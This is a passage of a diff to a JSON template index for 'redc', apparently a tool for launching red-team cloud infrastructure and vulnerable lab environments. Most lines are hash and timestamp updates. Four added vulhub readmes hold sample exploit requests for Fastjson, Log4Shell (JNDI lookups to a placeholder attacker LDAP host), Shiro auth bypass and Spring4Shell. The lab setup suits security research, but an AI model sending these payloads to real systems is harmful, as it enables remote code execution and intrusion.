@@ -1,5 +1,5 @@
 {
-  "updated_at": "2026-02-19T21:06:46.525500Z",
+  "updated_at": "2026-02-22T14:43:16.149997Z",
   "repo_name": "redc-template-source",
   "templates": {
     "aliyun/ecs": {
@@ -9,8 +9,8 @@
       "versions": {
         "1.0.2": {
           "url": "https://redc.zeoday.org/templates/aliyun_ecs_v1.0.2.zip",
-          "sha256": "ea14ac173149529ceff6973181ecb6dcdf908203ec834e32e7b2895bf5a51ec0",
-          "updated_at": "2026-02-19T21:06:46.493304Z"
+          "sha256": "9ecb7efedfbabce08d1d97f35fa6a1718064dfd35c196cfc48ecd245038f8183",
+          "updated_at": "2026-02-22T14:43:16.117396Z"
         }
       },
       "latest": "1.0.2",
@@ -28,8 +28,8 @@
       "versions": {
         "1.0.2": {
           "url": "https://redc.zeoday.org/templates/aliyun_ecs1c2g_v1.0.2.zip",
-          "sha256": "938260f7c62f71b05b2dd50c97a867d6348498e432f68a2d0fa45f9d5ad18f5d",
-          "updated_at": "2026-02-19T21:06:46.494419Z"
+          "sha256": "5077477c90bd98b064b016134b9b1ee7252c1c7f38bff83cbe24282d62aea367",
+          "updated_at": "2026-02-22T14:43:16.118718Z"
         }
       },
       "latest": "1.0.2",
@@ -47,8 +47,8 @@
       "versions": {
         "1.0.2": {
           "url": "https://redc.zeoday.org/templates/aliyun_file_v1.0.2.zip",
-          "sha256": "2c9b9058f461421a4f6b4aa5cf7ada58eddc058eb129fcc98c1f674672788994",
-          "updated_at": "2026-02-19T21:06:46.495500Z"
+          "sha256": "8742205efd4a2112ebdf4424fa3ba05eb85a20ee2cce8f355da988aac3248470",
+          "updated_at": "2026-02-22T14:43:16.119706Z"
         }
       },
       "latest": "1.0.2",
@@ -66,8 +66,8 @@
       "versions": {
         "1.0.2": {
           "url": "https://redc.zeoday.org/templates/aliyun_jndi_v1.0.2.zip",
-          "sha256": "015489bdd8c6aa2ea478aa17573a382bbe77feb597a0a8ec88e60994c45ee062",
-          "updated_at": "2026-02-19T21:06:46.496602Z"
+          "sha256": "3f5d60de4879cf5a51566af2fb9b4da925461d5c982d72143c3f68c998172c14",
+          "updated_at": "2026-02-22T14:43:16.120756Z"
         }
       },
       "latest": "1.0.2",
@@ -85,8 +85,8 @@
       "versions": {
         "1.0.7": {
           "url": "https://redc.zeoday.org/templates/aliyun_proxy_v1.0.7.zip",
-          "sha256": "eed95d412eb6256f20dce79b7224557462ed0028cfdf0677cfed83f94d664f2d",
-          "updated_at": "2026-02-19T21:06:46.497726Z"
+          "sha256": "195d5a7a3b435d14a9274a282e270098b9242dbedcce54954c3dce037172913f",
+          "updated_at": "2026-02-22T14:43:16.121853Z"
         }
       },
       "latest": "1.0.7",
@@ -104,8 +104,8 @@
       "versions": {
         "1.0.2": {
           "url": "https://redc.zeoday.org/templates/aliyun_sliver_v1.0.2.zip",
-          "sha256": "0c2c7899e3bd249f5116038ac9eeebac87ee81b60e592b3c8f91204f550db0ab",
-          "updated_at": "2026-02-19T21:06:46.498822Z"
+          "sha256": "ed13582e187e419e11f5662f7ae34f5822bac58989b02c7f9512b7549dd9a63e",
+          "updated_at": "2026-02-22T14:43:16.122868Z"
         }
       },
       "latest": "1.0.2",
@@ -123,8 +123,8 @@
       "versions": {
         "1.0.1": {
           "url": "https://redc.zeoday.org/templates/aliyun_yakit_v1.0.1.zip",
-          "sha256": "71030334214a1e28d1a1c26984dbca55fda28498972a02b811cd7ccce9d9b575",
-          "updated_at": "2026-02-19T21:06:46.499864Z"
+          "sha256": "921e96573d85bb2baa47c779b1df2c75f116f200a0143e69a26039a0721b610b",
+          "updated_at": "2026-02-22T14:43:16.123865Z"
         }
       },
       "latest": "1.0.1",
@@ -142,8 +142,8 @@
       "versions": {
         "1.0.8": {
           "url": "https://redc.zeoday.org/templates/aws_dnslog_v1.0.8.zip",
-          "sha256": "75425134050e7ca687b8661fdd7d71eb317b136c1f0aa6d387b09aea8930af1e",
-          "updated_at": "2026-02-19T21:06:46.500968Z"
+          "sha256": "a8d898550aa2dc8d26089fe182b6aa96e032822064a0743bbbb547bf3138e44c",
+          "updated_at": "2026-02-22T14:43:16.124902Z"
         }
       },
       "latest": "1.0.8",
@@ -161,8 +161,8 @@
       "versions": {
         "1.0.4": {
           "url": "https://redc.zeoday.org/templates/aws_docker_v1.0.4.zip",
-          "sha256": "f46237084d1f9aeccdc5ea16a2cad23ac8203b11abbd4d2ea4c2ae70803a1de8",
-          "updated_at": "2026-02-19T21:06:46.501776Z"
+          "sha256": "7fc39eb6fb636116d271a3a770a509daa3220046bfd98b0830b41b9208fa344f",
+          "updated_at": "2026-02-22T14:43:16.125678Z"
         }
       },
       "latest": "1.0.4",
@@ -180,8 +180,8 @@
       "versions": {
         "1.0.2": {
           "url": "https://redc.zeoday.org/templates/aws_ec2_v1.0.2.zip",
-          "sha256": "e604addf531f6e59d11f18fa9fbd787478d3bcff87f3c9f35c6ee25bb622f64f",
-          "updated_at": "2026-02-19T21:06:46.502561Z"
+          "sha256": "fdfb0d075aacd6f870acc3e3d593d719ebcd3892d17d9034d112a4364760a99f",
+          "updated_at": "2026-02-22T14:43:16.126415Z"
         }
       },
       "latest": "1.0.2",
@@ -199,8 +199,8 @@
       "versions": {
         "1.0.3": {
           "url": "https://redc.zeoday.org/templates/aws_ec2-1G_v1.0.3.zip",
-          "sha256": "5d27498e0252effc7a044d1fc91f82c0e89ae41d7b82b7fa3db0198654449ab8",
-          "updated_at": "2026-02-19T21:06:46.503352Z"
+          "sha256": "d992a96fad493e784b690ce6f5a3a082b77c0d7afe1c2bea96735875785210e8",
+          "updated_at": "2026-02-22T14:43:16.127158Z"
         }
       },
       "latest": "1.0.3",
@@ -218,8 +218,8 @@
       "versions": {
         "1.0.3": {
           "url": "https://redc.zeoday.org/templates/aws_ec2-4G_v1.0.3.zip",
-          "sha256": "5c68793d670573ef467c2499205128f850160eb28d894b3180bfabc4b0a65aa1",
-          "updated_at": "2026-02-19T21:06:46.504169Z"
+          "sha256": "6e296882faacde84d86261114b2498b6f176d14d42da75d8755d6cc8005e9f3d",
+          "updated_at": "2026-02-22T14:43:16.127953Z"
         }
       },
       "latest": "1.0.3",
@@ -237,8 +237,8 @@
       "versions": {
         "1.0.7": {
           "url": "https://redc.zeoday.org/templates/aws_interactsh_v1.0.7.zip",
-          "sha256": "f4c6c7d738749dfdc5fd0c9c5daaae1f50da7053d5471edf8297745346546f80",
-          "updated_at": "2026-02-19T21:06:46.505126Z"
+          "sha256": "b37098e44f720015c8c373109153978ea5499d557e12554a3a8e2e5c8e42c7ea",
+          "updated_at": "2026-02-22T14:43:16.128876Z"
         }
       },
       "latest": "1.0.7",
@@ -256,8 +256,8 @@
       "versions": {
         "1.0.4": {
           "url": "https://redc.zeoday.org/templates/aws_md_v1.0.4.zip",
-          "sha256": "cc689ac0e1b7fe551e1a5532e6ea4343047c432a30b86edba72c74532eea2856",
-          "updated_at": "2026-02-19T21:06:46.506113Z"
+          "sha256": "e59fc97e2ac267c4b7de5bc092328bcb75e998a37e7e529aff0f5ad82b129a45",
+          "updated_at": "2026-02-22T14:43:16.129809Z"
         }
       },
       "latest": "1.0.4",
@@ -275,8 +275,8 @@
       "versions": {
         "1.1.1": {
           "url": "https://redc.zeoday.org/templates/aws_proxy_v1.1.1.zip",
-          "sha256": "60eed0c7f643ceaa4b7e55ba49122490df886f39903398c262f105942fed2d6a",
-          "updated_at": "2026-02-19T21:06:46.507282Z"
+          "sha256": "11e0004c0af1e1308886a9e4deea327656b475fddb8c7ff1587b92eca0506435",
+          "updated_at": "2026-02-22T14:43:16.130828Z"
         }
       },
       "latest": "1.1.1",
@@ -294,8 +294,8 @@
       "versions": {
         "1.0.4": {
           "url": "https://redc.zeoday.org/templates/base-templates_alicloud-ecs_v1.0.4.zip",
-          "sha256": "57f94a5b9088bfe49d29dc3dc116f2c932ea904a3f2247ed2824dfe719f0854b",
-          "updated_at": "2026-02-19T21:06:46.508399Z"
+          "sha256": "e26aa3a87c2fccb8530b91fc840dce08fa57c06f78cb28e474bd59ce6e895291",
+          "updated_at": "2026-02-22T14:43:16.131884Z"
         }
       },
       "latest": "1.0.4",
@@ -313,8 +313,8 @@
       "versions": {
         "1.0.3": {
           "url": "https://redc.zeoday.org/templates/base-templates_volcengine-ecs_v1.0.3.zip",
-          "sha256": "1fb0fd191226c3fb42271c3e133386d0d8c9fdf36f76ebec52491689360c4df4",
-          "updated_at": "2026-02-19T21:06:46.509461Z"
+          "sha256": "f41e3c307fa8818ebf0c2d666da7f44ecf1e9c7aeb96af327ec6b2050b5de62c",
+          "updated_at": "2026-02-22T14:43:16.132872Z"
         }
       },
       "latest": "1.0.3",
@@ -332,8 +332,8 @@
       "versions": {
         "1.0.0": {
           "url": "https://redc.zeoday.org/templates/compose-templates_compose-example_v1.0.0.zip",
-          "sha256": "9097f757199d9106e5ba05b07aa90edef7e03fd57e364911174e62fa0e0eca05",
-          "updated_at": "2026-02-19T21:06:46.510014Z"
+          "sha256": "90ffffead0969ea917ed9ce44677edc6ee6f21bdc7a1d6d6d4500bb6dcfdb7e8",
+          "updated_at": "2026-02-22T14:43:16.133366Z"
         }
       },
       "latest": "1.0.0",
@@ -351,8 +351,8 @@
       "versions": {
         "0.0.4": {
           "url": "https://redc.zeoday.org/templates/huaweicloud_nps_v0.0.4.zip",
-          "sha256": "909dcb3273586118fdd2afbf5ba8ee77c5fa0b1f2be1a57740860aaeaf5677b0",
-          "updated_at": "2026-02-19T21:06:46.511230Z"
+          "sha256": "ac6457bd436bc8efe8a814f4b5f7d5193d643835cd995a582924071251928fdc",
+          "updated_at": "2026-02-22T14:43:16.134556Z"
         }
       },
       "latest": "0.0.4",
@@ -370,8 +370,8 @@
       "versions": {
         "1.0.1": {
           "url": "https://redc.zeoday.org/templates/tencent_cvm_v1.0.1.zip",
-          "sha256": "483a3d8471a8779e55bef2723656c9fd3bcbb85b115d16c3480869875cafe669",
-          "updated_at": "2026-02-19T21:06:46.512305Z"
+          "sha256": "e73ef6714fbd892ddf268e3881d0ecfcd7198d547065061ff883c50b7f1e61b8",
+          "updated_at": "2026-02-22T14:43:16.135529Z"
         }
       },
       "latest": "1.0.1",
@@ -389,8 +389,8 @@
       "versions": {
         "1.0.3": {
           "url": "https://redc.zeoday.org/templates/tencent_file_v1.0.3.zip",
-          "sha256": "2d7e65c11e193fea6a4a4f8639a2b2e87c8c6a678f2eafa755d734a22125595d",
-          "updated_at": "2026-02-19T21:06:46.513395Z"
+          "sha256": "99336c8878a0990da2db2154a3bf25ddf7059317b410fa3e9e626efb60db7eba",
+          "updated_at": "2026-02-22T14:43:16.136422Z"
         }
       },
       "latest": "1.0.3",
@@ -408,8 +408,8 @@
       "versions": {
         "1.0.3": {
           "url": "https://redc.zeoday.org/templates/tencent_jndi_v1.0.3.zip",
-          "sha256": "730d00cd81347f53fb75176016330d392b29668441967d212c3e98d8fc4fabf4",
-          "updated_at": "2026-02-19T21:06:46.514446Z"
+          "sha256": "8ba7c7cdc0f16ff58c52a577b54cfcbcf4d541e2ef4091289a3128f888d2b762",
+          "updated_at": "2026-02-22T14:43:16.137383Z"
         }
       },
       "latest": "1.0.3",
@@ -427,8 +427,8 @@
       "versions": {
         "1.0.6": {
           "url": "https://redc.zeoday.org/templates/tencent_nps_v1.0.6.zip",
-          "sha256": "068386640c8f84b1827fefbea19b5aca4317bc6354d18a8b826a70d513fe8cac",
-          "updated_at": "2026-02-19T21:06:46.515689Z"
+          "sha256": "bada2a36ad00e7b10dcfaf500c2bf98d651b13010fdd3d9147d87db71816fa3a",
+          "updated_at": "2026-02-22T14:43:16.138632Z"
         }
       },
       "latest": "1.0.6",
@@ -446,8 +446,8 @@
       "versions": {
         "1.0.1": {
           "url": "https://redc.zeoday.org/templates/userdata-templates_basic-setup-bash_v1.0.1.zip",
-          "sha256": "9cc25a737078793509ae1027354f6d312b8baf57ea7c2f7371d3d52329778ab8",
-          "updated_at": "2026-02-19T21:06:46.516254Z"
+          "sha256": "de9726d830852d315e59888ddc6929b469a7891b4fe9d8f9eae49a95340957bf",
+          "updated_at": "2026-02-22T14:43:16.139132Z"
         }
       },
       "latest": "1.0.1",
@@ -465,8 +465,8 @@
       "versions": {
         "1.0.1": {
           "url": "https://redc.zeoday.org/templates/userdata-templates_basic-setup-powershell_v1.0.1.zip",
-          "sha256": "5cd800ffdd1c9e4a740fec6243659212c99f47d9434ba7bc4975d9d4fe3f0be8",
-          "updated_at": "2026-02-19T21:06:46.516768Z"
+          "sha256": "1b0117c8c5bad1a430c55aaef1a7800478cb02d42ae5b35d2f2309fd3ec4196a",
+          "updated_at": "2026-02-22T14:43:16.139611Z"
         }
       },
       "latest": "1.0.1",
@@ -484,8 +484,8 @@
       "versions": {
         "1.0.1": {
           "url": "https://redc.zeoday.org/templates/userdata-templates_dify-bash_v1.0.1.zip",
-          "sha256": "3c0330d299fa89a3570aab1c6606d33ea6c6f6b5cbf7d073db7421173c343811",
-          "updated_at": "2026-02-19T21:06:46.517266Z"
+          "sha256": "21f566ad48748297aab0fda2b96721c50a60fc72eaf26576cd8147c3291830aa",
+          "updated_at": "2026-02-22T14:43:16.140069Z"
         }
       },
       "latest": "1.0.1",
@@ -503,8 +503,8 @@
       "versions": {
         "1.0.1": {
           "url": "https://redc.zeoday.org/templates/userdata-templates_docker-compose-bash_v1.0.1.zip",
-          "sha256": "cd08c1325febdf277c007f49a23996046d8f735d5c567516fb2693bf9617f092",
-          "updated_at": "2026-02-19T21:06:46.517747Z"
+          "sha256": "0e665db7e70ac9e4e70d7c6e814de4d0e02379e257ed597cc9e8013bf8e55fa8",
+          "updated_at": "2026-02-22T14:43:16.140531Z"
         }
       },
       "latest": "1.0.1",
@@ -522,8 +522,8 @@
       "versions": {
         "1.0.1": {
           "url": "https://redc.zeoday.org/templates/userdata-templates_docker-desktop-powershell_v1.0.1.zip",
-          "sha256": "260507fa590e7abac02293ef801f087c7b6c1bae1a9a4f3a62e319a4bfe316d4",
-          "updated_at": "2026-02-19T21:06:46.518251Z"
+          "sha256": "b3919237609b80ca5736fa286ec9e5ef45f89df66266be8972ffa7d38b228164",
+          "updated_at": "2026-02-22T14:43:16.140978Z"
         }
       },
       "latest": "1.0.1",
@@ -541,8 +541,8 @@
       "versions": {
         "1.0.1": {
           "url": "https://redc.zeoday.org/templates/userdata-templates_docker-installation-bash_v1.0.1.zip",
-          "sha256": "a0d7f712e2fa66846fcafd17a4c6ed4ac4d95778fa705d5ce40e0a4553ca9c0a",
-          "updated_at": "2026-02-19T21:06:46.518733Z"
+          "sha256": "9665641ffc251002c230908b738182218eb90229f7dcbfd43594311581f2761b",
+          "updated_at": "2026-02-22T14:43:16.141431Z"
         }
       },
       "latest": "1.0.1",
@@ -560,8 +560,8 @@
       "versions": {
         "1.0.1": {
           "url": "https://redc.zeoday.org/templates/userdata-templates_git-installation-powershell_v1.0.1.zip",
-          "sha256": "2dd1f0e05739c09ae8b8edc52da9215ca109c5a80d9dbc7472c41d4cff9b0b8b",
-          "updated_at": "2026-02-19T21:06:46.519228Z"
+          "sha256": "0702c78afcf2451487b18f7674aa177a170b65c90a037cc9603ae8aa705ff725",
+          "updated_at": "2026-02-22T14:43:16.141894Z"
         }
       },
       "latest": "1.0.1",
@@ -579,8 +579,8 @@
       "versions": {
         "1.0.1": {
           "url": "https://redc.zeoday.org/templates/userdata-templates_iis-installation-powershell_v1.0.1.zip",
-          "sha256": "c53a3299855bf73d3dd40213298b86e28108c16c3310a3d6604ad55a190316d7",
-          "updated_at": "2026-02-19T21:06:46.519707Z"
+          "sha256": "790cd08b38a2067aeae432de6a82930230a780ed1d2619c58fdb3a906ee0d01c",
+          "updated_at": "2026-02-22T14:43:16.142333Z"
         }
       },
       "latest": "1.0.1",
@@ -598,8 +598,8 @@
       "versions": {
         "1.0.1": {
           "url": "https://redc.zeoday.org/templates/userdata-templates_mysql-client-bash_v1.0.1.zip",
-          "sha256": "8981bb0f9e432e9795df4b74095a8cd06e5c385c38b4e70098e869d210e63779",
-          "updated_at": "2026-02-19T21:06:46.520192Z"
+          "sha256": "85634a4a920e4fc9d5ecd1ece32a923ad8d8164ad258c03e572e518c96bcd493",
+          "updated_at": "2026-02-22T14:43:16.142793Z"
         }
       },
       "latest": "1.0.1",
@@ -617,8 +617,8 @@
       "versions": {
         "1.0.1": {
           "url": "https://redc.zeoday.org/templates/userdata-templates_n8n-bash_v1.0.1.zip",
-          "sha256": "ccf6c0024d1a154e290ae5d2e71cfc0234fa38b03538e38a86513f5dfc883b3d",
-          "updated_at": "2026-02-19T21:06:46.520672Z"
+          "sha256": "2a79dbaad8de53e327b69ece9e1bf51f7429cf3e199bd056342cd756f18268a4",
+          "updated_at": "2026-02-22T14:43:16.143246Z"
         }
       },
       "latest": "1.0.1",
@@ -636,8 +636,8 @@
       "versions": {
         "1.0.1": {
           "url": "https://redc.zeoday.org/templates/userdata-templates_nginx-installation-bash_v1.0.1.zip",
-          "sha256": "fcfbd66efe8ee9bde5e27a06c111e21a8757b5d0a85f504f8e3c5b2a2ff856de",
-          "updated_at": "2026-02-19T21:06:46.521174Z"
+          "sha256": "67744491d806369f54035a7d7ae914376d73dbcdfc6694e9694cf2a5ec36a35d",
+          "updated_at": "2026-02-22T14:43:16.143717Z"
         }
       },
       "latest": "1.0.1",
@@ -655,8 +655,8 @@
       "versions": {
         "1.0.1": {
           "url": "https://redc.zeoday.org/templates/userdata-templates_nodejs-installation-bash_v1.0.1.zip",
-          "sha256": "e908ac87054e6ed3d2c1aa55cbbb4ee9668bb0eb22a0c6358b8d808629e48e80",
-          "updated_at": "2026-02-19T21:06:46.521640Z"
+          "sha256": "03f37ce7675e8db23b049296d2315483d15bc50ac533e36ddbf4da38510d1560",
+          "updated_at": "2026-02-22T14:43:16.144150Z"
         }
       },
       "latest": "1.0.1",
@@ -674,8 +674,8 @@
       "versions": {
         "1.0.2": {
           "url": "https://redc.zeoday.org/templates/userdata-templates_openclaw-bash_v1.0.2.zip",
-          "sha256": "e348bb6e607e346a84589288d56ad7f6afb8d9f85845a3dfc23806a276cbb1a5",
-          "updated_at": "2026-02-19T21:06:46.522146Z"
+          "sha256": "ac4fdc558fd22bd2a123b2bd40da8c65260871c9272611bf9c0826be14eaa213",
+          "updated_at": "2026-02-22T14:43:16.144618Z"
         }
       },
       "latest": "1.0.2",
@@ -693,8 +693,8 @@
       "versions": {
         "1.0.1": {
           "url": "https://redc.zeoday.org/templates/userdata-templates_postgresql-client-bash_v1.0.1.zip",
-          "sha256": "0a1270837efd7c1bef2bd02feeee0c41f2de33fd1a2d82f487aa3bfe55958064",
-          "updated_at": "2026-02-19T21:06:46.522618Z"
+          "sha256": "447086e552469362364ec06266643da450ee60b2775aefec62bf2118502ff5fc",
+          "updated_at": "2026-02-22T14:43:16.145086Z"
         }
       },
       "latest": "1.0.1",
@@ -712,8 +712,8 @@
       "versions": {
         "1.0.1": {
           "url": "https://redc.zeoday.org/templates/userdata-templates_python-installation-bash_v1.0.1.zip",
-          "sha256": "496caa0298eb1c3ddc56007a0a2af8b78d066bc986b6ee74c3c70ae9a5f18af6",
-          "updated_at": "2026-02-19T21:06:46.523122Z"
+          "sha256": "1eec149f1e2c7cbb46f888dd1636dc0ada5b8ed2daefd827996b121168ed2fff",
+          "updated_at": "2026-02-22T14:43:16.145548Z"
         }
       },
       "latest": "1.0.1",
@@ -731,8 +731,8 @@
       "versions": {
         "1.0.1": {
           "url": "https://redc.zeoday.org/templates/userdata-templates_vscode-installation-powershell_v1.0.1.zip",
-          "sha256": "945656723f8222e6efdffdc4cf3a2895899b38b841ea5c0517a0f8f057b49d9c",
-          "updated_at": "2026-02-19T21:06:46.523584Z"
+          "sha256": "cb77d14e820f57c8d6f948a85b34f94b1aa0350423bedf99c26d3cba41c28ac6",
+          "updated_at": "2026-02-22T14:43:16.146009Z"
         }
       },
       "latest": "1.0.1",
@@ -750,8 +750,8 @@
       "versions": {
         "1.0.3": {
           "url": "https://redc.zeoday.org/templates/volcengine_ecs_v1.0.3.zip",
-          "sha256": "a7e1dade3ac865fdd2099a3b057cfe71938fa0947e5d452d8c249dd05791dd62",
-          "updated_at": "2026-02-19T21:06:46.524535Z"
+          "sha256": "3f9d5e6f401ec7c3c1b7184365f208369e3ce785f941bcd68aee34ff08c7c17e",
+          "updated_at": "2026-02-22T14:43:16.146909Z"
         }
       },
       "latest": "1.0.3",
@@ -762,6 +762,82 @@
         "readme": "# 场景使用\n\n1. 使用前请按照注意事项里内容进行配置 (若空则无需配置)\n2. 使用时命令如下\n\n拉取\n```\nredc pull volcengine/ecs\n```\n\n开启\n```\nredc run volcengine/ecs\n```\n\n查询\n```\nredc status [uuid]\n```\n\n关闭\n```\nredc stop [uuid]\n```\n\n# 注意事项\n\n## 认证配置\n需要配置火山引擎的访问凭证，有以下两种方式：\n\n1. **环境变量方式**（推荐）\n```bash\nexport VOLCENGINE_ACCESS_KEY=\"your-access-key\"\nexport VOLCENGINE_SECRET_KEY=\"your-secret-key\"\n```\n\n2. **配置文件方式**\n在 `~/.volcengine/config` 中配置\n\n## 常见问题\n若启动场景报错，可能原因：\n1. 火山引擎账户余额不足\n2. 与火山引擎 API 网络连接超时\n3. 火山引擎该区域售罄或下架 instance_type 的配置机型\n4. 未配置正确的访问凭证（AK/SK）\n\n## 场景配置说明\n- **实例规格**: ecs.e-c1m1.large (2核2G内存)\n- **计费方式**: 按量计费（PostPaid）\n- **系统盘**: 20GB ESSD_PL0\n- **操作系统**: Debian 12\n- **登录方式**: 随机生成的SSH密码\n- **区域**: 北京（cn-beijing）\n"
       }
     },
+    "vulhub/fastjson-rce": {
+      "id": "vulhub/fastjson-rce",
+      "provider": "vulhub",
+      "slug": "fastjson-rce",
+      "versions": {
+        "1.0.0": {
+          "url": "https://redc.zeoday.org/templates/vulhub_fastjson-rce_v1.0.0.zip",
+          "sha256": "2ddbbc2645a2e7c5e178b3eded361cbceda59c22394a9b090bea19969f174b32",
+          "updated_at": "2026-02-22T14:43:16.147449Z"
+        }
+      },
+      "latest": "1.0.0",
+      "metadata": {
+        "name": "fastjson-rce",
+        "author": "redc",
+        "description": "Fastjson 反序列化远程代码执行漏洞，攻击者可利用 autotype 机制执行任意代码",
+        "readme": "# Fastjson 远程代码执行\n\n## 漏洞简介\n\nFastjson 是一个高性能的 JSON 库，但其 autotype 机制存在反序列化漏洞，攻击者可以通过构造特殊的 JSON 数据来触发 JNDI 注入或执行任意代码。\n\n## 漏洞信息\n\n- **漏洞类型**: RCE (远程代码执行)\n- **危险等级**: High (高危)\n- **影响版本**: Fastjson < 1.2.48\n\n## 环境信息\n\n- **镜像**: vulhub/fastjson:1.2.47\n- **端口**: 8090\n- **服务**: Fastjson RCE 测试环境\n\n## 使用方法\n\n1. 在云服务器上执行 userdata 脚本\n2. 脚本会自动安装 Docker 并启动 Fastjson 漏洞环境\n3. 访问 `http://<your-ip>:8090` 进行测试\n\n## 测试方法\n\n```bash\n# 发送恶意 JSON 数据（需要 JNDI 工具配合）\ncurl -X POST \"http://<your-ip>:8090\" -d '{\"@type\":\"com.sun.rowset.JdbcRowSet1\",\"dataSourceName\":\"ldap://<attacker>/Exploit\",\"autoCommit\":true}'\n```\n\n## 注意事项\n\n- 此环境仅用于安全研究\n- 请在防火墙中限制访问来源\n- 测试完成后请及时删除环境\n\n## 参考链接\n\n- [Vulhub Fastjson 漏洞环境](https://github.com/vulhub/vulhub/tree/master/fastjson)\n"
+      }
+    },
+    "vulhub/log4j-rce": {
+      "id": "vulhub/log4j-rce",
+      "provider": "vulhub",
+      "slug": "log4j-rce",
+      "versions": {
+        "1.0.0": {
+          "url": "https://redc.zeoday.org/templates/vulhub_log4j-rce_v1.0.0.zip",
+          "sha256": "3c9e5de2446873979b6b085d1a2f5d97a5cbead24bcba8a90483affb976c66de",
+          "updated_at": "2026-02-22T14:43:16.148036Z"
+        }
+      },
+      "latest": "1.0.0",
+      "metadata": {
+        "name": "log4j-rce",
+        "author": "redc",
+        "description": "Apache Log4j2 JNDI 远程代码执行漏洞，又称 Log4Shell",
+        "readme": "# Log4j RCE (CVE-2021-44228)\n\n## 漏洞简介\n\nApache Log4j2 JNDI 远程代码执行漏洞，又称 Log4Shell，是近年来最严重的漏洞之一。攻击者可以利用 Log4j 的日志记录功能，通过构造特殊的日志消息来触发 JNDI 远程加载，从而执行任意代码。\n\n## CVE 信息\n\n- **CVE 编号**: CVE-2021-44228\n- **漏洞类型**: RCE (远程代码执行)\n- **危险等级**: Critical (严重)\n- **影响版本**: Log4j 2.0 ~ 2.14.1\n\n## 环境信息\n\n- **镜像**: vulhub/log4j:2.17.0\n- **端口**: 8989\n- **服务**: Log4j RCE 测试环境\n\n## 使用方法\n\n1. 在云服务器上执行 userdata 脚本\n2. 脚本会自动安装 Docker 并启动 Log4j 漏洞环境\n3. 访问 `http://<your-ip>:8989` 进行测试\n\n## 测试方法\n\n```bash\n# 使用 curl 发送恶意请求\ncurl -X GET \"http://<your-ip>:8989\" -H \"X-Api-Version: \\${jndi:ldap://<your-attacker-server>/Exploit}\"\n```\n\n## 注意事项\n\n- 此环境仅用于安全研究\n- 请在防火墙中限制访问来源\n- 测试完成后请及时删除环境\n\n## 参考链接\n\n- [Vulhub Log4j 漏洞环境](https://github.com/vulhub/vulhub/tree/master/log4j/CVE-2021-44228)\n- [NVD CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)\n"
+      }
+    },
+    "vulhub/shiro-rce": {
+      "id": "vulhub/shiro-rce",
+      "provider": "vulhub",
+      "slug": "shiro-rce",
+      "versions": {
+        "1.0.0": {
+          "url": "https://redc.zeoday.org/templates/vulhub_shiro-rce_v1.0.0.zip",
+          "sha256": "5d4bd709db41480e91aab49f8dfb344357afc8690e77d28becd363e549eac7ff",
+          "updated_at": "2026-02-22T14:43:16.148584Z"
+        }
+      },
+      "latest": "1.0.0",
+      "metadata": {
+        "name": "shiro-rce",
+        "author": "redc",
+        "description": "Apache Shiro 认证绕过漏洞，攻击者可构造特殊 URL 绕过身份验证",
+        "readme": "# Shiro RCE (CVE-2020-1957)\n\n## 漏洞简介\n\nApache Shiro 是一个强大的安全框架，用于身份验证、授权、加密和会话管理。CVE-2020-1957 是 Apache Shiro 的认证绕过漏洞，攻击者可以通过构造特殊的 URL 路径来绕过身份验证。\n\n## CVE 信息\n\n- **CVE 编号**: CVE-2020-1957\n- **漏洞类型**: RCE / 认证绕过\n- **危险等级**: High (高危)\n- **影响版本**: Shiro < 1.5.2\n\n## 环境信息\n\n- **镜像**: vulhub/shiro:1.4.2\n- **端口**: 8080\n- **服务**: Shiro RCE 测试环境\n\n## 使用方法\n\n1. 在云服务器上执行 userdata 脚本\n2. 脚本会自动安装 Docker 并启动 Shiro 漏洞环境\n3. 访问 `http://<your-ip>:8080` 进行测试\n\n## 测试方法\n\n```bash\n# 构造认证绕过请求\ncurl -X GET \"http://<your-ip>:8080/xxx/../admin/page\"\n```\n\n## 注意事项\n\n- 此环境仅用于安全研究\n- 请在防火墙中限制访问来源\n- 测试完成后请及时删除环境\n\n## 参考链接\n\n- [Vulhub Shiro 漏洞环境](https://github.com/vulhub/vulhub/tree/master/shiro/CVE-2020-1957)\n- [NVD CVE-2020-1957](https://nvd.nist.gov/vuln/detail/CVE-2020-1957)\n"
+      }
+    },
+    "vulhub/spring-core-rce": {
+      "id": "vulhub/spring-core-rce",
+      "provider": "vulhub",
+      "slug": "spring-core-rce",
+      "versions": {
+        "1.0.0": {
+          "url": "https://redc.zeoday.org/templates/vulhub_spring-core-rce_v1.0.0.zip",
+          "sha256": "4fd0bfd2a8bd8db2e1e7f36317e3cc5720ee3bba96c920bafac2f83612bb6de0",
+          "updated_at": "2026-02-22T14:43:16.149100Z"
+        }
+      },
+      "latest": "1.0.0",
+      "metadata": {
+        "name": "spring-core-rce",
+        "author": "redc",
+        "description": "Spring Framework 远程代码执行漏洞，攻击者可利用 SpEL 表达式执行任意代码",
+        "readme": "# Spring Core RCE (CVE-2022-22965)\n\n## 漏洞简介\n\nSpring Framework 远程代码执行漏洞，攻击者可利用 SpEL 表达式注入执行任意代码。该漏洞存在于 Spring 框架的参数绑定机制中，通过构造特殊的请求参数可以触发 SpEL 表达式执行。\n\n## CVE 信息\n\n- **CVE 编号**: CVE-2022-22965\n- **漏洞类型**: RCE (远程代码执行)\n- **危险等级**: Critical (严重)\n- **影响版本**: Spring Framework 5.3.0 ~ 5.3.17\n\n## 环境信息\n\n- **镜像**: vulhub/spring-core-rce\n- **端口**: 8080\n- **服务**: Spring Core RCE 测试环境\n\n## 使用方法\n\n1. 在云服务器上执行 userdata 脚本\n2. 脚本会自动安装 Docker 并启动 Spring Core 漏洞环境\n3. 访问 `http://<your-ip>:8080` 进行测试\n\n## 测试方法\n\n```bash\n# 使用 curl 发送恶意请求（需要根据实际环境调整）\ncurl -X POST \"http://<your-ip>:8080\" -d \"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%23\"\n```\n\n## 注意事项\n\n- 此环境仅用于安全研究\n- 请在防火墙中限制访问来源\n- 测试完成后请及时删除环境\n\n## 参考链接\n\n- [Vulhub Spring Core RCE 漏洞环境](https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22965)\n- [NVD CVE-2022-22965](https://nvd.nist.gov/vuln/detail/CVE-2022-22965)\n"
+      }
+    },
     "vultr/hk-vps": {
       "id": "vultr/hk-vps",
       "provider": "vultr",
@@ -769,8 +845,8 @@
       "versions": {
         "1.0.1": {
           "url": "https://redc.zeoday.org/templates/vultr_hk-vps_v1.0.1.zip",
-          "sha256": "c182e7f74a0ac90da6f2db3352b6540deef96b3f8a7e1a7060dc03fe4d3d63ef",
